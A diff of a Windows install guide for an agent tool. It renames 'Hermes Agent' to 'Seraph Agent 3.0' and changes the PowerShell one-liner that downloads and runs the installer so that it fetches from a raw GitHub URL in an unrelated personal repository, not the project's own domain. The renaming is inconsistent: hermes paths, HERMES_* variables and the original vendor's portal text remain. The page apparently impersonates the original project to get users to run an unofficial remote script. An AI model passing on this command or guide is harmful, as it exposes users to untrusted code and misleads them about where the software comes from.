@@ -1,6 +1,6 @@
 ---
 title: "Windows (Native) Guide"
-description: "Run Hermes Agent natively on Windows 10 / 11 — install, feature matrix, UTF-8 console, Git Bash, gateway as a Scheduled Task, editor handling, PATH, uninstall, and common pitfalls"
+description: "Run Seraph Agent 3.0 natively on Windows 10 / 11 — install, feature matrix, UTF-8 console, Git Bash, gateway as a Scheduled Task, editor handling, PATH, uninstall, and common pitfalls"
 sidebar_label: "Windows (Native)"
 sidebar_position: 3
 ---
@@ -28,12 +28,12 @@ No admin rights required. The installer goes to `%LOCALAPPDATA%\hermes\` and add
 **Installer options** use a scriptblock:
 
 ```powershell
-& ([scriptblock]::Create((irm https://hermes-agent.nousresearch.com/install.ps1))) -NonInteractive -Channel main
+& ([scriptblock]::Create((irm https://raw.githubusercontent.com/ZHpike0478/seraph-agent-3.0/main/scripts/install.ps1))) -NonInteractive -Channel main
 ```
 
 | Parameter | Purpose |
 |---|---|
-| `-Channel stable\|main` | `stable` (default): the latest published release. `main`: every commit, saved like `hermes update --set-channel main`. `$env:HERMES_INSTALL_CHANNEL` sets it for a plain `irm \| iex`. |
+| `-Channel stable\|main` | `stable` (default): the latest published release. `main`: every commit, saved like `seraph update --set-channel main`. `$env:HERMES_INSTALL_CHANNEL` sets it for a plain `irm \| iex`. |
 | `-Branch NAME` | Select the source branch; default `main`. Another branch is installed at its tip. |
 | `-Commit SHA` | Select a commit after the branch checkout. |
 | `-HermesHome PATH` | Select the data directory. |
@@ -70,7 +70,7 @@ relaunch. It does not require the `ms-appinstaller:` URL protocol. An unknown
 update-check result is not a claim that the package is current.
 
 The Microsoft Store variant uses its Partner Center package identity and Store
-updates. It does not use the sideload feed. `hermes update` inside either
+updates. It does not use the sideload feed. `seraph update` inside either
 bundled runtime does not run Git against package files.
 
 `Hermes-Setup.exe` is a different, bootstrap installer. It provisions a source
@@ -87,8 +87,8 @@ recorded state; a missing optional tool is fetched on demand only when
 permits it. `install.ps1` has no `-Ensure` mode.
 
 ```powershell
-hermes pm doctor
-hermes pm install
+seraph pm doctor
+seraph pm install
 ```
 
 ## What the source installer does
@@ -108,7 +108,7 @@ replacing libraries already loaded by a running process. There is no tiered
 pip fallback to silently reduce the installed feature set.
 
 :::tip Skip provider hunting on Windows
-On Windows, per-tool API key setup (Firecrawl, FAL, Browser Use, OpenAI TTS) is the highest-friction part of getting a useful agent. A [Nous Portal](./features/tool-gateway.md) subscription covers the model **and** all of those tools through one OAuth login. After the installer finishes, run `hermes setup --portal` to wire everything up.
+On Windows, per-tool API key setup (Firecrawl, FAL, Browser Use, OpenAI TTS) is the highest-friction part of getting a useful agent. A [Nous Portal](./features/tool-gateway.md) subscription covers the model **and** all of those tools through one OAuth login. After the installer finishes, run `seraph setup --portal` to wire everything up.
 :::
 
 ## Feature matrix
@@ -118,8 +118,8 @@ natively, but some optional SDKs are excluded from particular targets.
 
 | Feature | Native Windows | WSL2 |
 |---|---|---|
-| CLI (`hermes chat`, `hermes setup`, `hermes gateway`, …) | ✓ | ✓ |
-| Interactive TUI (`hermes --tui`) | ✓ | ✓ |
+| CLI (`seraph chat`, `seraph setup`, `seraph gateway`, …) | ✓ | ✓ |
+| Interactive TUI (`seraph --tui`) | ✓ | ✓ |
 | Messaging gateway (Telegram, Discord, Slack, WhatsApp, 15+ platforms) | ✓ | ✓ |
 | Cron scheduler | ✓ | ✓ |
 | Browser tool (Chromium via Node) | ✓ | ✓ |
@@ -211,19 +211,19 @@ On legacy `cmd.exe` consoles `Ctrl+Enter` collapses to plain `Enter` — use `Es
 
 ## Running the gateway at Windows login
 
-`hermes gateway install` on Windows uses **Scheduled Tasks** with a Startup-folder fallback — no admin required.
+`seraph gateway install` on Windows uses **Scheduled Tasks** with a Startup-folder fallback — no admin required.
 
 ### Install
 
 ```powershell
-hermes gateway install
+seraph gateway install
 ```
 
 What happens under the hood:
 
 1. `schtasks /Create /SC ONLOGON /RL LIMITED /TN Hermes_Gateway` — registers a task that runs at your login with standard (non-elevated) permissions. No UAC prompt.
 2. If schtasks is blocked by group policy, falls back to writing a small `Hermes_Gateway.vbs` launcher (run hidden via `wscript.exe`) into `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`. Same effect, slightly cruder. A VBScript is used rather than a `cmd.exe` shortcut because a console allocated at logon can receive a close event that kills the gateway before it finishes starting.
-   Only one of the two is ever kept: a successful task install removes any Startup-folder entry (including a legacy `Hermes_Gateway.cmd`), the fallback is skipped while a task is still registered, and `hermes update` / `hermes doctor --fix` clean up older installs that have both, since both would launch the gateway at logon.
+   Only one of the two is ever kept: a successful task install removes any Startup-folder entry (including a legacy `Hermes_Gateway.cmd`), the fallback is skipped while a task is still registered, and `seraph update` / `seraph doctor --fix` clean up older installs that have both, since both would launch the gateway at logon.
 3. Spawns the gateway **detached via `pythonw.exe`** — not `python.exe`. `pythonw.exe` has no console attached, which immunizes it against `CTRL_C_EVENT` broadcasts from sibling processes (a real issue that used to kill the gateway when you Ctrl+C'd anything in the same process group).
 
 Flags used when spawning: `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW | CREATE_BREAKAWAY_FROM_JOB`.
@@ -231,20 +231,20 @@ Flags used when spawning: `DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_
 ### Manage
 
 ```powershell
-hermes gateway status      # Merged view: schtasks + Startup folder + running PID
-hermes gateway start       # Starts the gateway in the background (asks about login auto-start only on a TTY when nothing is installed)
-hermes gateway stop        # Writes the planned-stop marker, waits for the gateway to drain (≤ agent.restart_drain_timeout, capped at 30 s), then force-kills only if it is still alive
-hermes gateway restart     # Same drain-first stop, then a fresh start
-hermes gateway uninstall   # Removes schtasks entry, Startup shortcut, pid file
+seraph gateway status      # Merged view: schtasks + Startup folder + running PID
+seraph gateway start       # Starts the gateway in the background (asks about login auto-start only on a TTY when nothing is installed)
+seraph gateway stop        # Writes the planned-stop marker, waits for the gateway to drain (≤ agent.restart_drain_timeout, capped at 30 s), then force-kills only if it is still alive
+seraph gateway restart     # Same drain-first stop, then a fresh start
+seraph gateway uninstall   # Removes schtasks entry, Startup shortcut, pid file
 ```
 
-`hermes gateway status` is idempotent — call it a thousand times in a row and it will never accidentally kill the gateway. (Pre-PR #21561 it silently did, via `os.kill(pid, 0)` colliding with `CTRL_C_EVENT` at the C level — see "process management internals" below if you care about the story.)
+`seraph gateway status` is idempotent — call it a thousand times in a row and it will never accidentally kill the gateway. (Pre-PR #21561 it silently did, via `os.kill(pid, 0)` colliding with `CTRL_C_EVENT` at the C level — see "process management internals" below if you care about the story.)
 
-Login auto-start is only ever installed on an explicit answer: `hermes gateway install`, a `Y` on a real terminal, or `HERMES_GATEWAY_INSTALL_START_ON_LOGIN=1`. A scripted or piped `hermes gateway start` (no TTY, or `HERMES_NONINTERACTIVE=1`) starts the gateway without touching the Scheduled Task or the Startup folder; set `HERMES_GATEWAY_INSTALL_START_ON_LOGIN=0` to skip the question on a terminal too.
+Login auto-start is only ever installed on an explicit answer: `seraph gateway install`, a `Y` on a real terminal, or `HERMES_GATEWAY_INSTALL_START_ON_LOGIN=1`. A scripted or piped `seraph gateway start` (no TTY, or `HERMES_NONINTERACTIVE=1`) starts the gateway without touching the Scheduled Task or the Startup folder; set `HERMES_GATEWAY_INSTALL_START_ON_LOGIN=0` to skip the question on a terminal too.
 
 ### Why not a Windows Service?
 
-Services require admin rights to install and tie the gateway's lifecycle to machine boot, not user login. The typical Hermes user wants: log in → gateway available, log out → gateway gone. Scheduled Tasks do exactly that without elevation. If you genuinely want a service, use `nssm` or `sc create` manually — but you probably don't. If you do, name it `Hermes*` or point its binary path inside the Hermes install (`venv\Scripts\hermes.exe`, the checkout, or `gateway-service\`): `hermes update` stops and restarts only services it can positively identify as Hermes-owned through the Service Control Manager, and pauses a Scheduled-Task-launched gateway by PID (Task Scheduler itself is never touched).
+Services require admin rights to install and tie the gateway's lifecycle to machine boot, not user login. The typical Hermes user wants: log in → gateway available, log out → gateway gone. Scheduled Tasks do exactly that without elevation. If you genuinely want a service, use `nssm` or `sc create` manually — but you probably don't. If you do, name it `Hermes*` or point its binary path inside the Hermes install (`venv\Scripts\hermes.exe`, the checkout, or `gateway-service\`): `seraph update` stops and restarts only services it can positively identify as Hermes-owned through the Service Control Manager, and pauses a Scheduled-Task-launched gateway by PID (Task Scheduler itself is never touched).
 
 ## Data layout
 
@@ -265,9 +265,9 @@ Windows package removal instead of deleting that root to repair an app.
 
 The browser tool (`browser_exec`) is part of Hermes's Python environment.
 For local browsing, Hermes launches the pinned Chromium that PM installs
-(`hermes pm install chromium` if it is missing); set `browser.executable_path`
+(`seraph pm install chromium` if it is missing); set `browser.executable_path`
 to use another Chromium-family binary. Cloud browsers are selected in
-`hermes tools`. A self-contained MSIX includes the browser tools in its payload.
+`seraph tools`. A self-contained MSIX includes the browser tools in its payload.
 
 On Windows ARM64, the pinned Chromium is the x64 build and runs under
 Windows' x64 emulation. This differs from the native ARM64 Python runtime.
@@ -283,7 +283,7 @@ Verify:
 
 ```powershell
 Get-Command hermes        # should print C:\Users\<you>\AppData\Local\hermes\bin\hermes.exe
-hermes --version
+seraph --version
 ```
 
 ### Environment variables
@@ -311,23 +311,23 @@ These only affect native Windows installs:
 From PowerShell:
 
 ```powershell
-hermes uninstall
+seraph uninstall
 ```
 
 For source installs, the uninstaller removes owned launchers, service entries,
-and application files. Review `hermes uninstall --dry-run` before removal.
+and application files. Review `seraph uninstall --dry-run` before removal.
 `--full` also removes data; `--data` removes data without removing packaged code.
 For MSIX or Store installations, remove the app through Windows Settings →
 Apps → Installed apps. The CLI refuses to delete package-owned code.
 
 :::caution User-data deletion
 Before deleting data, stop every Hermes process that uses the selected `HERMES_HOME` and make a backup.
-Review `hermes uninstall --dry-run` before choosing a data-removal mode.
+Review `seraph uninstall --dry-run` before choosing a data-removal mode.
 Do not recursively delete the default data root to repair one application or profile.
 A custom `HERMES_HOME` can be elsewhere, and package removal does not remove that data.
 :::
 
-The `hermes uninstall` CLI subcommand also handles the case where the schtasks entry was registered under a different task name (older installs) — it searches by install path rather than by hardcoded task name.
+The `seraph uninstall` CLI subcommand also handles the case where the schtasks entry was registered under a different task name (older installs) — it searches by install path rather than by hardcoded task name.
 
 ## Process management internals
 
@@ -351,13 +351,13 @@ You hit a shebang-script invocation that bypassed the `.cmd` shim. Hermes resolv
 Your download of `install.ps1` picked up a UTF-8 BOM. The `irm | iex` form strips BOMs automatically; `[scriptblock]::Create((irm ...))` does not. Re-run with the simple `irm | iex` form, or download the script manually and save it without a BOM via `[IO.File]::WriteAllText($path, $text, (New-Object Text.UTF8Encoding $false))`.
 
 **Gateway won't stay running after restart.**
-Check `hermes gateway status` — it merges the schtasks entry, the Startup-folder shortcut (if used), and the live PID. If schtasks is registered but not running, group policy may be blocking `ONLOGON` triggers. Run `schtasks /Query /TN Hermes_Gateway /V /FO LIST` (`Hermes_Gateway_<profile>` for a named profile) to see the task's failure reason. The Startup-folder fallback engages automatically only when `schtasks` itself fails to register the task; there is no environment variable or flag to force it.
+Check `seraph gateway status` — it merges the schtasks entry, the Startup-folder shortcut (if used), and the live PID. If schtasks is registered but not running, group policy may be blocking `ONLOGON` triggers. Run `schtasks /Query /TN Hermes_Gateway /V /FO LIST` (`Hermes_Gateway_<profile>` for a named profile) to see the task's failure reason. The Startup-folder fallback engages automatically only when `schtasks` itself fails to register the task; there is no environment variable or flag to force it.
 
 **`/edit` still does nothing after setting `$env:EDITOR`.**
 You set it in the current process only; close and reopen the shell, or set it at User scope in System Properties → Environment Variables. Verify with `echo $env:EDITOR` in a new PowerShell window.
 
 **Browser tool launches but tools time out.**
-Run `hermes doctor` and `hermes pm doctor`. Use `hermes tools` to inspect the
+Run `seraph doctor` and `seraph pm doctor`. Use `seraph tools` to inspect the
 selected browser provider. A slow first Chromium start can be given more time
 with `browser.command_timeout` (the launch timeout floor, in seconds). Do not
 install an unrelated Playwright revision into a signed app payload.
